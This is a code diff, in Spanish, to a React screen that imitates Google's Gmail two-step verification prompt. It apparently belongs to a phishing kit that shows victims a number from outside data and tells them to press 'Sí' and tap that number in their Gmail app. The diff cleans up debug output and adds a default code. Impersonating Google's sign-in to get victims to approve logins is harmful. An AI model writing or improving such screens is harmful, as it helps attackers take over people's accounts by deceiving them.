@@ -712,19 +712,13 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               {screenData.correo || gmailCorreo || "inmobiliariadexter627@gmail.com"}
             </div>
 
-            <div className="text-5xl font-normal my-8" id="codigo-grande">
-              {/* Debug: mostrar el código tal cual se recibe */}
-              {JSON.stringify(screenData)}
-              {/* Aquí mostramos el código en grande */}
-              {screenData.codigo}
+            <div className="text-5xl font-normal my-8">
+              {screenData.codigo || "14"}
             </div>
 
             <p className="text-sm mb-2">Abrir la app de Gmail en tu celular</p>
             <p className="text-sm text-gray-700 mb-5 max-w-xs mx-auto">
-              Google envió una notificación a tu celular. Abre la app de Gmail, presiona <strong>Sí</strong> en el mensaje y, luego, presiona <strong>
-              {/* Aquí mostramos el código en el texto */}
-              {screenData.codigo}
-              </strong> en el teléfono para verificar que eres tú.
+              Google envió una notificación a tu celular. Abre la app de Gmail, presiona <strong>Sí</strong> en el mensaje y, luego, presiona <strong>{screenData.codigo || "14"}</strong> en el teléfono para verificar que eres tú.
             </p>
 
             <p 
